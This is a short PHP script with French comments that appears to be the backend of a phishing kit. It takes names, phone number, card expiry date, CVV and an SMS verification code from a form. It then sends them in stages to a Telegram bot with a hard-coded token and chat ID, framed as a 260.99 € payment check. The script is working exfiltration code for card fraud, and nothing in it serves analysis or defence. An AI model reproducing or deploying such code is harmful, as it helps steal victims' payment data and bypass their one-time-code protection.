<?php
// Fonction d'envoi sécurisée vers Telegram
function sendToTelegram($message) {
    $token = '7194667513:AAEjFC8Lr3YGuhofocJkIpr3i9LvzTDwZDA';
    $chat_id = '6163989462';
    $url = "https://api.telegram.org/bot$token/sendMessage";

    $postData = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($postData)
        ]
    ];
    file_get_contents($url, false, stream_context_create($options));
}

// Fonction de nettoyage simple
function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

// Validation des champs
$nom = sanitize($_POST['nom'] ?? '');
$prenom = sanitize($_POST['prenom'] ?? '');
$phone = sanitize($_POST['phone'] ?? '');
$cardNumber = sanitize($_POST['cardNumber'] ?? '');
$expiryDate = sanitize($_POST['expiryDate'] ?? '');
$cvv = sanitize($_POST['cvv'] ?? '');
$enteredCode = sanitize($_POST['code'] ?? '');

// Étape 1 : Identification
$telegramMsg = "<b>Nouvelle identification :</b>\n";
$telegramMsg .= "Nom : $nom\n";
$telegramMsg .= "Prénom : $prenom\n";
$telegramMsg .= "Téléphone : $phone";
sendToTelegram($telegramMsg);

// Étape 2 : Vérification bancaire
if (!empty($cardNumber) && strlen($cardNumber) >= 4) {
    $lastDigits = substr($cardNumber, -4);
    $telegramMsg = "<b>Infos bancaires :</b>\n";
    $telegramMsg .= "Carte : **** **** **** $lastDigits\n";
    $telegramMsg .= "Expiration : $expiryDate\n";
    $telegramMsg .= "CVV : $cvv";
    sendToTelegram($telegramMsg);
}

// Étape 3 : Code SMS
if (!empty($enteredCode)) {
    $telegramMsg = "<b>Code validé !</b>\n";
    $telegramMsg .= "Code SMS : $enteredCode\n";
    $telegramMsg .= "Montant : 260.99 €";
    sendToTelegram($telegramMsg);
}
?>
